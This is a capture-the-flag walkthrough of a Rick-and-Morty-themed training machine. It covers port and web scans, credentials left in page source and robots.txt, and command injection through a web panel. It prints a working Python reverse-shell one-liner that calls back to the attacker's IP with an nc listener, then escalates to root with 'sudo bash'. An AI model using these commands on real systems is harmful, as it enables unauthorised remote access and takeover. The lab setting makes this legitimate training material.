# Scans

## Main page Source code
```php
$ curl http://10.10.124.19/
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```

## Nmap
~~~
$ sudo nmap -sS -p- 10.10.124.19
[sudo] password for unknown: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-29 07:12 CEST
Nmap scan report for 10.10.124.19
Host is up (0.091s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 127.03 seconds
~~~


## Nikto
```
$ ./nikto.pl -h http://10.10.124.19/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.124.19
+ Target Hostname:    10.10.124.19
+ Target Port:        80
+ Start Time:         2020-04-29 08:06:25 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.41). Apache 2.2.34 is the EOL for the 2.x branch.
+ Cookie PHPSESSID created without the httponly flag
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 8047 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2020-04-29 08:14:20 (GMT2) (475 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Gobuster
~~~
unknown@unknown:/data/src/wordlists$ gobuster -u http://10.10.124.19/ -w directory-list-2.3-medium.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.124.19/
[+] Threads      : 10
[+] Wordlist     : directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2020/04/29 08:12:43 Starting gobuster
=====================================================
/assets (Status: 301)
/server-status (Status: 403)
=====================================================
2020/04/29 08:30:25 Finished
=====================================================
~~~

## robots.txt
~~~
$ curl http://10.10.124.19/robots.txt
Wubbalubbadubdub
~~~




# Collected information
* Version: Apache/2.4.18 (outdated)
* Paths:
  * /index.html
  * /login.php
  * /icons/
  * /assets/
* Username: R1ckRul3s
* Password: Wubbalubbadubdub

# Login

http://10.10.124.19/login.php
Authenticate with login/password found and jump to http://10.10.124.19/portal.php

# Commands panel

## ls
~~~
ls

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
~~~

~~~
less clue.txt
Look around the file system for the other ingredient.
~~~

~~~
less Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
~~~


~~~
grep -R .


~~~

~~~
$ echo -n "Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==" | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
base64: invalid input
base64: invalid input
rabbit hole
~~~


~~~
python3 -V
Python 3.5.2
~~~


## Reverse shell

~~~
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.35.106",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
~~~

# Solution
 	
## What is the first ingredient Rick needs?

~~~
mr. meeseek hair
~~~

## What is the second ingredient Rick needs?

Open a listener on your machine:
~~~
$ nc -lnvp 9999
~~~

Create the reverse shell by injecting the following payload to the command form (web page):

~~~
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.35.106",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
~~~

On the reverse shell:

~~~
$ cd /home
$ ls
rick
ubuntu
$ cd rick
$ ls
second ingredients
$ cat second\ ingredients
1 jerry tear
~~~

## What is the final ingredient Rick needs?

~~~
fleeb juice
~~~

~~~
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-10-207-16:/home/rick$ ls
ls
second ingredients
www-data@ip-10-10-207-16:/home/rick$ sudo -s
sudo -s
This account is currently not available.
www-data@ip-10-10-207-16:/home/rick$ sudo ubuntu
sudo ubuntu
sudo: ubuntu: command not found
www-data@ip-10-10-207-16:/home/rick$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ip-10-10-207-16:/home/rick$ sudo bash
sudo bash
root@ip-10-10-207-16:/home/rick# cd /ro	
cd /root/
root@ip-10-10-207-16:~# cd /root
cd /root
root@ip-10-10-207-16:~# ls
ls
3rd.txt  snap
root@ip-10-10-207-16:~# cat 3rd.txt
cat 3rd.txt
3rd ingredients: fleeb juice
root@ip-10-10-207-16:~# 
~~~